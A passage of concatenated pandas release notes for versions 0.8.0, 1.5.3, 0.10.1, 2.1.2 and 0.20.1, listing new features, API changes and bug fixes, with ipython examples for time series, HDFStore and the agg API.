timestamps\n- Milli, Micro, Nano date offset objects\n- Can index time series with datetime.time objects to select all data at\n  particular **time of day** (``TimeSeries.at_time``) or **between two times**\n  (``TimeSeries.between_time``)\n- Add :ref:`tshift <timeseries.advanced_datetime>` method for leading/lagging\n  using the frequency (if any) of the index, as opposed to a naive lead/lag\n  using shift\n\nOther new features\n~~~~~~~~~~~~~~~~~~\n\n- New :ref:`cut <reshaping.tile.cut>` and ``qcut`` functions (like R's cut\n  function) for computing a categorical variable from a continuous variable by\n  binning values either into value-based (``cut``) or quantile-based (``qcut``)\n  bins\n- Rename ``Factor`` to ``Categorical`` and add a number of usability features\n- Add :ref:`limit <missing_data.fillna.limit>` argument to fillna/reindex\n- More flexible multiple function application in GroupBy, and can pass list\n  (name, function) tuples to get result in particular order with given names\n- Add flexible :ref:`replace <missing_data.replace>` method for efficiently\n  substituting values\n- Enhanced :ref:`read_csv/read_table <io.parse_dates>` for reading time series\n  data and converting multiple columns to dates\n- Add :ref:`comments <io.comments>` option to parser functions: read_csv, etc.\n- Add :ref:`dayfirst <io.dayfirst>` option to parser functions for parsing\n  international DD/MM/YYYY dates\n- Allow the user to specify the CSV reader :ref:`dialect <io.dialect>` to\n  control quoting etc.\n- Handling :ref:`thousands <io.thousands>` separators in read_csv to improve\n  integer parsing.\n- Enable unstacking of multiple levels in one shot. Alleviate ``pivot_table``\n  bugs (empty columns being introduced)\n- Move to klib-based hash tables for indexing; better performance and less\n  memory usage than Python's dict\n- Add first, last, min, max, and prod optimized GroupBy functions\n- New :ref:`ordered_merge <merging.merge_ordered>` function\n- Add flexible :ref:`comparison <basics.binop>` instance methods eq, ne, lt,\n  gt, etc. to DataFrame, Series\n- Improve :ref:`scatter_matrix <visualization.scatter_matrix>` plotting\n  function and add histogram or kernel density estimates to diagonal\n- Add :ref:`'kde' <visualization.kde>` plot option for density plots\n- Support for converting DataFrame to R data.frame through rpy2\n- Improved support for complex numbers in Series and DataFrame\n- Add ``pct_change`` method to all data structures\n- Add max_colwidth configuration option for DataFrame console output\n- :ref:`Interpolate <missing_data.interpolate>` Series values using index values\n- Can select multiple columns from GroupBy\n- Add :ref:`update <merging.combine_first.update>` methods to Series/DataFrame\n  for updating values in place\n- Add ``any`` and ``all`` method to DataFrame\n\nNew plotting methods\n~~~~~~~~~~~~~~~~~~~~\n\n.. code-block:: python\n\n   import pandas as pd\n\n   fx = pd.read_pickle(\"data/fx_prices\")\n   import matplotlib.pyplot as plt\n\n``Series.plot`` now supports a ``secondary_y`` option:\n\n.. code-block:: python\n\n   plt.figure()\n\n   fx[\"FR\"].plot(style=\"g\")\n\n   fx[\"IT\"].plot(style=\"k--\", secondary_y=True)\n\nVytautas Jancauskas, the 2012 GSOC participant, has added many new plot\ntypes. For example, ``'kde'`` is a new option:\n\n.. code-block:: python\n\n   s = pd.Series(\n       np.concatenate((np.random.randn(1000), np.random.randn(1000) * 0.5 + 3))\n   )\n   plt.figure()\n   s.hist(density=True, alpha=0.2)\n   s.plot(kind=\"kde\")\n\nSee :ref:`the plotting page <visualization.other>` for much more.\n\nOther API changes\n~~~~~~~~~~~~~~~~~\n\n- Deprecation of ``offset``, ``time_rule``, and ``timeRule`` arguments names in\n  time series functions. Warnings will be printed until pandas 0.9 or 1.0.\n\nPotential porting issues for pandas <= 0.7.3 users\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe major change that may affect you in pandas 0.8.0 is that time series\nindexes use NumPy's ``datetime64`` data type instead of ``dtype=object`` arrays\nof Python's built-in ``datetime.datetime`` objects. ``DateRange`` has been\nreplaced by ``DatetimeIndex`` but otherwise behaved identically. But, if you\nhave code that converts ``DateRange`` or ``Index`` objects that used to contain\n``datetime.datetime`` values to plain NumPy arrays, you may have bugs lurking\nwith code using scalar values because you are handing control over to NumPy:\n\n.. ipython:: python\n\n   import datetime\n\n   rng = pd.date_range(\"1/1/2000\", periods=10)\n   rng[5]\n   isinstance(rng[5], datetime.datetime)\n   rng_asarray = np.asarray(rng)\n   scalar_val = rng_asarray[5]\n   type(scalar_val)\n\npandas's ``Timestamp`` object is a subclass of ``datetime.datetime`` that has\nnanosecond support (the ``nanosecond`` field store the nanosecond value between\n0 and 999). It should substitute directly into any code that used\n``datetime.datetime`` values before. Thus, I recommend not casting\n``DatetimeIndex`` to regular NumPy arrays.\n\nIf you have code that requires an array of ``datetime.datetime`` objects, you\nhave a couple of options. First, the ``astype(object)`` method of ``DatetimeIndex``\nproduces an array of ``Timestamp`` objects:\n\n.. ipython:: python\n\n   stamp_array = rng.astype(object)\n   stamp_array\n   stamp_array[5]\n\nTo get an array of proper ``datetime.datetime`` objects, use the\n``to_pydatetime`` method:\n\n.. ipython:: python\n\n   dt_array = rng.to_pydatetime()\n   dt_array\n   dt_array[5]\n\nmatplotlib knows how to handle ``datetime.datetime`` but not Timestamp\nobjects. While I recommend that you plot time series using ``TimeSeries.plot``,\nyou can either use ``to_pydatetime`` or register a converter for the Timestamp\ntype. See `matplotlib documentation\n<http://matplotlib.org/api/units_api.html>`__ for more on this.\n\n.. warning::\n\n    There are bugs in the user-facing API with the nanosecond datetime64 unit\n    in NumPy 1.6. In particular, the string version of the array shows garbage\n    values, and conversion to ``dtype=object`` is similarly broken.\n\n    .. ipython:: python\n\n       rng = pd.date_range(\"1/1/2000\", periods=10)\n       rng\n       np.asarray(rng)\n       converted = np.asarray(rng, dtype=object)\n       converted[5]\n\n    **Trust me: don't panic**. If you are using NumPy 1.6 and restrict your\n    interaction with ``datetime64`` values to pandas's API you will be just\n    fine. There is nothing wrong with the data-type (a 64-bit integer\n    internally); all of the important data processing happens in pandas and is\n    heavily tested. I strongly recommend that you **do not work directly with\n    datetime64 arrays in NumPy 1.6** and only use the pandas API.\n\n\n**Support for non-unique indexes**: In the latter case, you may have code\ninside a ``try:... catch:`` block that failed due to the index not being\nunique. In many cases it will no longer fail (some method like ``append`` still\ncheck for uniqueness unless disabled). However, all is not lost: you can\ninspect ``index.is_unique`` and raise an exception explicitly if it is\n``False`` or go to a different code branch.\n\n\n.. _whatsnew_0.8.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.3..v0.8.0\n\n\n.. _whatsnew_153:\n\nWhat's new in 1.5.3 (January 18, 2023)\n--------------------------------------\n\nThese are the changes in pandas 1.5.3. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed performance regression in :meth:`Series.isin` when ``values`` is empty (:issue:`49839`)\n- Fixed regression in :meth:`DataFrame.memory_usage` showing unnecessary ``FutureWarning`` when :class:`DataFrame` is empty (:issue:`50066`)\n- Fixed regression in :meth:`.DataFrameGroupBy.transform` when used with ``as_index=False`` (:issue:`49834`)\n- Enforced reversion of ``color`` as an alias for ``c`` and ``size`` as an alias for ``s`` in function :meth:`DataFrame.plot.scatter` (:issue:`49732`)\n- Fixed regression in :meth:`.SeriesGroupBy.apply` setting a ``name`` attribute on the result if the result was a :class:`DataFrame` (:issue:`49907`)\n- Fixed performance regression in setting with the :meth:`~DataFrame.at` indexer (:issue:`49771`)\n- Fixed regression in :func:`to_datetime` raising ``ValueError`` when parsing array of ``float`` containing ``np.nan`` (:issue:`50237`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in the Copy-on-Write implementation losing track of views when indexing a :class:`DataFrame` with another :class:`DataFrame` (:issue:`50630`)\n- Bug in :meth:`.Styler.to_excel` leading to error when unrecognized ``border-style`` (e.g. ``\"hair\"``) provided to Excel writers (:issue:`48649`)\n- Bug in :meth:`Series.quantile` emitting warning from NumPy when :class:`Series` has only ``NA`` values (:issue:`50681`)\n- Bug when chaining several :meth:`.Styler.concat` calls, only the last styler was concatenated (:issue:`49207`)\n- Fixed bug when instantiating a :class:`DataFrame` subclass inheriting from ``typing.Generic`` that triggered a ``UserWarning`` on python 3.11 (:issue:`49649`)\n- Bug in :func:`pivot_table` with NumPy 1.24 or greater when the :class:`DataFrame` columns has nested elements (:issue:`50342`)\n- Bug in :func:`pandas.testing.assert_series_equal` (and equivalent ``assert_`` functions) when having nested data and using numpy >= 1.25 (:issue:`50360`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.other:\n\nOther\n~~~~~\n\n.. note::\n\n    If you are using :meth:`DataFrame.to_sql`, :func:`read_sql`, :func:`read_sql_table`, or :func:`read_sql_query` with SQLAlchemy 1.4.46 or greater,\n    you may see a ``sqlalchemy.exc.RemovedIn20Warning``. These warnings can be safely ignored for the SQLAlchemy 1.4.x releases\n    as pandas works toward compatibility with SQLAlchemy 2.0.\n\n- Reverted deprecation (:issue:`45324`) of behavior of :meth:`Series.__getitem__` and :meth:`Series.__setitem__` slicing with an integer :class:`Index`; this will remain positional (:issue:`49612`)\n- A ``FutureWarning`` raised when attempting to set values inplace with :meth:`DataFrame.loc` or :meth:`DataFrame.iloc` has been changed to a ``DeprecationWarning`` (:issue:`48673`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_153.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.5.2..v1.5.3\n\n\n.. _whatsnew_0101:\n\nVersion 0.10.1 (January 22, 2013)\n---------------------------------\n\n{{ header }}\n\n\nThis is a minor release from 0.10.0 and includes new features, enhancements,\nand bug fixes. In particular, there is substantial new HDFStore functionality\ncontributed by Jeff Reback.\n\nAn undesired API breakage with functions taking the ``inplace`` option has been\nreverted and deprecation warnings added.\n\nAPI changes\n~~~~~~~~~~~\n\n- Functions taking an ``inplace`` option return the calling object as before. A\n  deprecation message has been added\n- Groupby aggregations Max/Min no longer exclude non-numeric data (:issue:`2700`)\n- Resampling an empty DataFrame now returns an empty DataFrame instead of\n  raising an exception (:issue:`2640`)\n- The file reader will now raise an exception when NA values are found in an\n  explicitly specified integer column instead of converting the column to float\n  (:issue:`2631`)\n- DatetimeIndex.unique now returns a DatetimeIndex with the same name and\n- timezone instead of an array (:issue:`2563`)\n\nNew features\n~~~~~~~~~~~~\n\n- MySQL support for database (contribution from Dan Allan)\n\nHDFStore\n~~~~~~~~\n\nYou may need to upgrade your existing data files. Please visit the\n**compatibility** section in the main docs.\n\n\n.. ipython:: python\n   :suppress:\n   :okexcept:\n\n   import os\n\n   os.remove(\"store.h5\")\n\nYou can designate (and index) certain columns that you want to be able to\nperform queries on a table, by passing a list to ``data_columns``\n\n.. ipython:: python\n\n   store = pd.HDFStore(\"store.h5\")\n   df = pd.DataFrame(\n       np.random.randn(8, 3),\n       index=pd.date_range(\"1/1/2000\", periods=8),\n       columns=[\"A\", \"B\", \"C\"],\n   )\n   df[\"string\"] = \"foo\"\n   df.loc[df.index[4:6], \"string\"] = np.nan\n   df.loc[df.index[7:9], \"string\"] = \"bar\"\n   df[\"string2\"] = \"cool\"\n   df\n\n    on-disk operations\n   store.append(\"df\", df, data_columns=[\"B\", \"C\", \"string\", \"string2\"])\n   store.select(\"df\", \"B>0 and string=='foo'\")\n\n    this is in-memory version of this type of selection\n   df[(df.B > 0) & (df.string == \"foo\")]\n\nRetrieving unique values in an indexable or data column.\n\n.. code-block:: python\n\n    note that this is deprecated as of 0.14.0\n    can be replicated by: store.select_column('df','index').unique()\n   store.unique(\"df\", \"index\")\n   store.unique(\"df\", \"string\")\n\nYou can now store ``datetime64`` in data columns\n\n.. ipython:: python\n\n    df_mixed = df.copy()\n    df_mixed[\"datetime64\"] = pd.Timestamp(\"20010102\")\n    df_mixed.loc[df_mixed.index[3:4], [\"A\", \"B\"]] = np.nan\n\n    store.append(\"df_mixed\", df_mixed)\n    df_mixed1 = store.select(\"df_mixed\")\n    df_mixed1\n    df_mixed1.dtypes.value_counts()\n\nYou can pass ``columns`` keyword to select to filter a list of the return\ncolumns, this is equivalent to passing a\n``Term('columns',list_of_columns_to_filter)``\n\n.. ipython:: python\n\n   store.select(\"df\", columns=[\"A\", \"B\"])\n\n``HDFStore`` now serializes MultiIndex dataframes when appending tables.\n\n.. code-block:: ipython\n\n    In [19]: index = pd.MultiIndex(levels=[['foo', 'bar', 'baz', 'qux'],\n       ....:                               ['one', 'two', 'three']],\n       ....:                       labels=[[0, 0, 0, 1, 1, 2, 2, 3, 3, 3],\n       ....:                               [0, 1, 2, 0, 1, 1, 2, 0, 1, 2]],\n       ....:                       names=['foo', 'bar'])\n       ....:\n\n    In [20]: df = pd.DataFrame(np.random.randn(10, 3), index=index,\n       ....:                   columns=['A', 'B', 'C'])\n       ....:\n\n    In [21]: df\n    Out[21]:\n                      A         B         C\n    foo bar\n    foo one   -0.116619  0.295575 -1.047704\n        two    1.640556  1.905836  2.772115\n        three  0.088787 -1.144197 -0.633372\n    bar one    0.925372 -0.006438 -0.820408\n        two   -0.600874 -1.039266  0.824758\n    baz two   -0.824095 -0.337730 -0.927764\n        three -0.840123  0.248505 -0.109250\n    qux one    0.431977 -0.460710  0.336505\n        two   -3.207595 -1.535854  0.409769\n        three -0.673145 -0.741113 -0.110891\n\n    In [22]: store.append('mi', df)\n\n    In [23]: store.select('mi')\n    Out[23]:\n                      A         B         C\n    foo bar\n    foo one   -0.116619  0.295575 -1.047704\n        two    1.640556  1.905836  2.772115\n        three  0.088787 -1.144197 -0.633372\n    bar one    0.925372 -0.006438 -0.820408\n        two   -0.600874 -1.039266  0.824758\n    baz two   -0.824095 -0.337730 -0.927764\n        three -0.840123  0.248505 -0.109250\n    qux one    0.431977 -0.460710  0.336505\n        two   -3.207595 -1.535854  0.409769\n        three -0.673145 -0.741113 -0.110891\n\n     the levels are automatically included as data columns\n    In [24]: store.select('mi', \"foo='bar'\")\n    Out[24]:\n                    A         B         C\n    foo bar\n    bar one  0.925372 -0.006438 -0.820408\n        two -0.600874 -1.039266  0.824758\n\nMulti-table creation via ``append_to_multiple`` and selection via\n``select_as_multiple`` can create/select from multiple tables and return a\ncombined result, by using ``where`` on a selector table.\n\n.. ipython:: python\n\n   df_mt = pd.DataFrame(\n       np.random.randn(8, 6),\n       index=pd.date_range(\"1/1/2000\", periods=8),\n       columns=[\"A\", \"B\", \"C\", \"D\", \"E\", \"F\"],\n   )\n   df_mt[\"foo\"] = \"bar\"\n\n    you can also create the tables individually\n   store.append_to_multiple(\n       {\"df1_mt\": [\"A\", \"B\"], \"df2_mt\": None}, df_mt, selector=\"df1_mt\"\n   )\n   store\n\n    individual tables were created\n   store.select(\"df1_mt\")\n   store.select(\"df2_mt\")\n\n    as a multiple\n   store.select_as_multiple(\n       [\"df1_mt\", \"df2_mt\"], where=[\"A>0\", \"B>0\"], selector=\"df1_mt\"\n   )\n\n.. ipython:: python\n   :suppress:\n\n   store.close()\n   os.remove(\"store.h5\")\n\n**Enhancements**\n\n- ``HDFStore`` now can read native PyTables table format tables\n\n- You can pass ``nan_rep = 'my_nan_rep'`` to append, to change the default nan\n  representation on disk (which converts to/from ``np.nan``), this defaults to\n  ``nan``.\n\n- You can pass ``index`` to ``append``. This defaults to ``True``. This will\n  automagically create indices on the *indexables* and *data columns* of the\n  table\n\n- You can pass ``chunksize=an integer`` to ``append``, to change the writing\n  chunksize (default is 50000). This will significantly lower your memory usage\n  on writing.\n\n- You can pass ``expectedrows=an integer`` to the first ``append``, to set the\n  TOTAL number of expected rows that ``PyTables`` will expected. This will\n  optimize read/write performance.\n\n- ``Select`` now supports passing ``start`` and ``stop`` to provide selection\n  space limiting in selection.\n\n- Greatly improved ISO8601 (e.g., yyyy-mm-dd) date parsing for file parsers (:issue:`2698`)\n- Allow ``DataFrame.merge`` to handle combinatorial sizes too large for 64-bit\n  integer (:issue:`2690`)\n- Series now has unary negation (-series) and inversion (~series) operators (:issue:`2686`)\n- DataFrame.plot now includes a ``logx`` parameter to change the x-axis to log scale (:issue:`2327`)\n- Series arithmetic operators can now handle constant and ndarray input (:issue:`2574`)\n- ExcelFile now takes a ``kind`` argument to specify the file type (:issue:`2613`)\n- A faster implementation for Series.str methods (:issue:`2602`)\n\n**Bug Fixes**\n\n- ``HDFStore`` tables can now store ``float32`` types correctly (cannot be\n  mixed with ``float64`` however)\n- Fixed Google Analytics prefix when specifying request segment (:issue:`2713`).\n- Function to reset Google Analytics token store so users can recover from\n  improperly setup client secrets (:issue:`2687`).\n- Fixed groupby bug resulting in segfault when passing in MultiIndex (:issue:`2706`)\n- Fixed bug where passing a Series with datetime64 values into ``to_datetime``\n  results in bogus output values (:issue:`2699`)\n- Fixed bug in ``pattern in HDFStore`` expressions when pattern is not a valid\n  regex (:issue:`2694`)\n- Fixed performance issues while aggregating boolean data (:issue:`2692`)\n- When given a boolean mask key and a Series of new values, Series __setitem__\n  will now align the incoming values with the original Series (:issue:`2686`)\n- Fixed MemoryError caused by performing counting sort on sorting MultiIndex\n  levels with a very large number of combinatorial values (:issue:`2684`)\n- Fixed bug that causes plotting to fail when the index is a DatetimeIndex with\n  a fixed-offset timezone (:issue:`2683`)\n- Corrected business day subtraction logic when the offset is more than 5 bdays\n  and the starting date is on a weekend (:issue:`2680`)\n- Fixed C file parser behavior when the file has more columns than data\n  (:issue:`2668`)\n- Fixed file reader bug that misaligned columns with data in the presence of an\n  implicit column and a specified ``usecols`` value\n- DataFrames with numerical or datetime indices are now sorted prior to\n  plotting (:issue:`2609`)\n- Fixed DataFrame.from_records error when passed columns, index, but empty\n  records (:issue:`2633`)\n- Several bug fixed for Series operations when dtype is datetime64 (:issue:`2689`,\n  :issue:`2629`, :issue:`2626`)\n\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n.. _whatsnew_0.10.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.10.0..v0.10.1\n\n\n.. _whatsnew_212:\n\nWhat's new in 2.1.2 (October 26, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- Reverted deprecation of ``fill_method=None`` in :meth:`DataFrame.pct_change`, :meth:`Series.pct_change`, :meth:`DataFrameGroupBy.pct_change`, and :meth:`SeriesGroupBy.pct_change`; the values ``'backfill'``, ``'bfill'``, ``'pad'``, and ``'ffill'`` are still deprecated (:issue:`53491`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.join` where result has missing values and dtype is arrow backed string (:issue:`55348`)\n- Fixed regression in :meth:`~DataFrame.rolling` where non-nanosecond index or ``on`` column would produce incorrect results (:issue:`55026`, :issue:`55106`, :issue:`55299`)\n- Fixed regression in :meth:`DataFrame.resample` which was extrapolating back to ``origin`` when ``origin`` was outside its bounds (:issue:`55064`)\n- Fixed regression in :meth:`DataFrame.sort_index` which was not sorting correctly when the index was a sliced :class:`MultiIndex` (:issue:`55379`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` and :meth:`SeriesGroupBy.agg` where if the option ``compute.use_numba`` was set to True, groupby methods not supported by the numba engine would raise a ``TypeError`` (:issue:`55520`)\n- Fixed performance regression with wide DataFrames, typically involving methods where all columns were accessed individually (:issue:`55256`, :issue:`55245`)\n- Fixed regression in :func:`merge_asof` raising ``TypeError`` for ``by`` with datetime and timedelta dtypes (:issue:`55453`)\n- Fixed regression in :func:`read_parquet` when reading a file with a string column consisting of more than 2 GB of string data and using the ``\"string\"`` dtype (:issue:`55606`)\n- Fixed regression in :meth:`DataFrame.to_sql` not roundtripping datetime columns correctly for sqlite when using ``detect_types`` (:issue:`55554`)\n- Fixed regression in construction of certain DataFrame or Series subclasses (:issue:`54922`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug in :class:`.DataFrameGroupBy` reductions not preserving object dtype when ``infer_string`` is set (:issue:`55620`)\n- Fixed bug in :meth:`.SeriesGroupBy.value_counts` returning incorrect dtype for string columns (:issue:`55627`)\n- Fixed bug in :meth:`Categorical.equals` if other has arrow backed string dtype (:issue:`55364`)\n- Fixed bug in :meth:`DataFrame.__setitem__` not inferring string dtype for zero-dimensional array with ``infer_string=True`` (:issue:`55366`)\n- Fixed bug in :meth:`DataFrame.idxmin` and :meth:`DataFrame.idxmax` raising for arrow dtypes (:issue:`55368`)\n- Fixed bug in :meth:`DataFrame.interpolate` raising incorrect error message (:issue:`55347`)\n- Fixed bug in :meth:`Index.insert` raising when inserting ``None`` into :class:`Index` with ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`55365`)\n- Fixed bug in :meth:`Series.all`  and :meth:`Series.any` not treating missing values correctly for ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`55367`)\n- Fixed bug in :meth:`Series.floordiv` for :class:`ArrowDtype` (:issue:`55561`)\n- Fixed bug in :meth:`Series.mode` not sorting values for arrow backed string dtype (:issue:`55621`)\n- Fixed bug in :meth:`Series.rank` for ``string[pyarrow_numpy]`` dtype (:issue:`55362`)\n- Fixed bug in :meth:`Series.str.extractall` for :class:`ArrowDtype` dtype being converted to object (:issue:`53846`)\n- Fixed bug where PDEP-6 warning about setting an item of an incompatible dtype was being shown when creating a new conditional column (:issue:`55025`)\n- Silence ``Period[B]`` warnings introduced by :issue:`53446` during normal plotting activity (:issue:`55138`)\n- Fixed bug in :class:`Series` constructor not inferring string dtype when ``NA`` is the first value and ``infer_string`` is set (:issue:` 55655`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.other:\n\nOther\n~~~~~\n- Fixed non-working installation of optional dependency group ``output_formatting``. Replacing underscore ``_`` with a dash ``-`` fixes broken dependency resolution. A correct way to use now is ``pip install pandas[output-formatting]``.\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_212.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.1..v2.1.2\n\n\n.. _whatsnew_0200:\n\nVersion 0.20.1 (May 5, 2017)\n----------------------------\n\n{{ header }}\n\nThis is a major release from 0.19.2 and includes a number of API changes, deprecations, new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\nHighlights include:\n\n- New ``.agg()`` API for Series/DataFrame similar to the groupby-rolling-resample API's, see :ref:`here <whatsnew_0200.enhancements.agg>`\n- Integration with the ``feather-format``, including a new top-level ``pd.read_feather()`` and ``DataFrame.to_feather()`` method, see :ref:`here <io.feather>`.\n- The ``.ix`` indexer has been deprecated, see :ref:`here <whatsnew_0200.api_breaking.deprecate_ix>`\n- ``Panel`` has been deprecated, see :ref:`here <whatsnew_0200.api_breaking.deprecate_panel>`\n- Addition of an ``IntervalIndex`` and ``Interval`` scalar type, see :ref:`here <whatsnew_0200.enhancements.intervalindex>`\n- Improved user API when grouping by index levels in ``.groupby()``, see :ref:`here <whatsnew_0200.enhancements.groupby_access>`\n- Improved support for ``UInt64`` dtypes, see :ref:`here <whatsnew_0200.enhancements.uint64_support>`\n- A new orient for JSON serialization, ``orient='table'``, that uses the Table Schema spec and that gives the possibility for a more interactive repr in the Jupyter Notebook, see :ref:`here <whatsnew_0200.enhancements.table_schema>`\n- Experimental support for exporting styled DataFrames (``DataFrame.style``) to Excel, see :ref:`here <whatsnew_0200.enhancements.style_excel>`\n- Window binary corr/cov operations now return a MultiIndexed ``DataFrame`` rather than a ``Panel``, as ``Panel`` is now deprecated, see :ref:`here <whatsnew_0200.api_breaking.rolling_pairwise>`\n- Support for S3 handling now uses ``s3fs``, see :ref:`here <whatsnew_0200.api_breaking.s3>`\n- Google BigQuery support now uses the ``pandas-gbq`` library, see :ref:`here <whatsnew_0200.api_breaking.gbq>`\n\n.. warning::\n\n  pandas has changed the internal structure and layout of the code base.\n  This can affect imports that are not from the top-level ``pandas.*`` namespace, please see the changes :ref:`here <whatsnew_0200.privacy>`.\n\nCheck the :ref:`API Changes <whatsnew_0200.api_breaking>` and :ref:`deprecations <whatsnew_0200.deprecations>` before updating.\n\n.. note::\n\n   This is a combined release for 0.20.0 and 0.20.1.\n   Version 0.20.1 contains one additional change for backwards-compatibility with downstream projects using pandas' ``utils`` routines. (:issue:`16250`)\n\n.. contents:: What's new in v0.20.0\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0200.enhancements:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0200.enhancements.agg:\n\nMethod ``agg`` API for DataFrame/Series\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSeries & DataFrame have been enhanced to support the aggregation API. This is a familiar API\nfrom groupby, window operations, and resampling. This allows aggregation operations in a concise way\nby using :meth:`~DataFrame.agg` and :meth:`~DataFrame.transform`. The full documentation\nis :ref:`here <basics.aggregate>` (:issue:`1623`).\n\nHere is a sample\n\n.. ipython:: python\n\n   df = pd.DataFrame(np.random.randn(10, 3), columns=['A', 'B', 'C'],\n                     index=pd.date_range('1/1/2000', periods=10))\n   df.iloc[3:7] = np.nan\n   df\n\nOne can operate using string function names, callables, lists, or dictionaries of these.\n\nUsing a single function is equivalent to ``.apply``.\n\n.. ipython:: python\n\n   df.agg('sum')\n\nMultiple aggregations with a list of functions.\n\n.. ipython:: python\n\n   df.agg(['sum', 'min'])\n\nUsing a dict provides the ability to apply specific aggregations per column.\nYou will get a matrix-like output of all of the aggregators. The output has one column\nper unique function. Those functions applied to a particular column will be ``NaN``:\n\n.. ipython:: python\n\n   df.agg({'A': ['sum', 'min'], 'B': ['min', 'max']})\n\nThe API also supports a ``.transform()`` function for broadcasting results.\n\n.. ipython:: python\n   :okwarning:\n\n   df.transform(['abs', lambda x: x - x.min()])\n\nWhen presented with mixed dtypes that cannot be aggregated, ``.agg()`` will only take the valid\naggregations. This is similar to how groupby ``.agg()`` works. (:issue:`15015`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'A': [1, 2, 3],\n                      'B': [1., 2., 3.],\n                      'C': ['foo', 'bar', 'baz'],\n                      'D': pd.date_range('20130101', periods=3)})\n   df.dtypes\n\n.. code-block:: python\n\n   In [10]: df.agg(['min', 'sum'])\n   Out[10]:\n        A    B          C          D\n   min  1  1.0        bar 2013-01-01\n   sum  6  6.0  foobarbaz        NaT\n\n.. _whatsnew_0200.enhancements.dataio_dtype:\n\nKeyword argument ``dtype`` for data IO\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``'python'`` engine for :func:`read_csv`, as well as the :func:`read_fwf` function for parsing\nfixed-width text files and :func:`read_excel` for parsing Excel files, now accept the ``dtype`` keyword argument for specifying the types of specific columns (:issue:`14295`). See the :ref:`io docs <io.dtypes>` for more information.\n\n.. ipython:: python\n   :suppress:\n\n   from io import StringIO\n\n.. ipython:: python\n\n   data = \"a  b\\n1  2\\n3  4\"\n   pd.read_fwf(StringIO(data)).dtypes\n   pd.read_fwf(StringIO(data), dtype={'a': 'float64', 'b': 'object'}).dtypes\n\n.. _whatsnew_0120.enhancements.datetime_origin:\n\nMethod ``.to_datetime()`` has gained an ``origin`` parameter\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`to_datetime` has gained a new parameter, ``origin``, to define a reference date\nfrom where to compute the resulting timestamps when parsing numerical values with a specific ``unit`` specified. (:issue:`11276`, :issue:`11745`)\n\nFor example, with 1960-01-01 as the starting date:\n\n.. ipython:: python\n\n   pd.to_datetime([1, 2, 3], unit='D', origin=pd.Timestamp('1960-01-01'))\n\nThe default is set at ``origin='unix'``, which defaults to ``1970-01-01 00:00:00``, which is\ncommonly called 'unix epoch' or POSIX time. This was the previous default, so this is a backward compatible change.\n\n.. ipython:: python\n\n   pd.to_datetime([1, 2, 3], unit='D')\n\n\n.. _whatsnew_0200.enhancements.groupby_access:\n\nGroupBy enhancements\n^^^^^^^^^^^^^^^^^^^^\n\nStrings passed to ``DataFrame.groupby()`` as the ``by`` parameter may now reference either column names or index level names. Previously, only column names could be referenced. This allows to easily group by a column and index level at the same time. (:issue:`5677`)\n\n.. ipython:: python\n\n   arrays = [['bar', 'bar', 'baz', 'baz', 'foo', 'foo', 'qux', 'qux'],\n             ['one', 'two', 'one', 'two', 'one', 'two', 'one', 'two']]\n\n   index = pd.MultiIndex.from_arrays(arrays, names=['first', 'second'])\n\n   df = pd.DataFrame({'A': [1, 1, 1, 1, 2, 2, 3, 3],\n                      'B': np.arange(8)},\n                     index=index)\n   df\n\n   df.groupby(['second', 'A']).sum()\n\n\n.. _whatsnew_0200.enhancements.compressed_urls:\n\nBetter support for compressed URLs in ``read_csv``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe compression code was refactored (:issue:`12688`). As a result, reading\ndataframes from URLs in :func:`read_csv` or :func:`read_table` now supports\nadditional compression methods: ``xz``, ``bz2``, and ``zip`` (:issue:`14570`).\nPreviously, only ``gzip`` compression was supported. By default, compression of\nURLs and paths are now inferred using their file extensions. Additionally,\nsupport for bz2 compression in the python 2 C-engine improved (:issue:`14874`).\n\n.. ipython:: python\n\n   url = ('https://github.com/{repo}/raw/{branch}/{path}'\n          .format(repo='pandas-dev/pandas',\n                  branch='main',\n                  path='pandas/tests/io/parser/data/salaries.csv.bz2'))\n    default, infer compression\n   df = pd.read_csv(url, sep='\\t', compression='infer')\n    explicitly specify compression\n   df = pd.read_csv(url, sep='\\t', compression='bz2')\n   df.head(2)\n\n.. _whatsnew_0200.enhancements.pickle_compression:\n\nPickle file 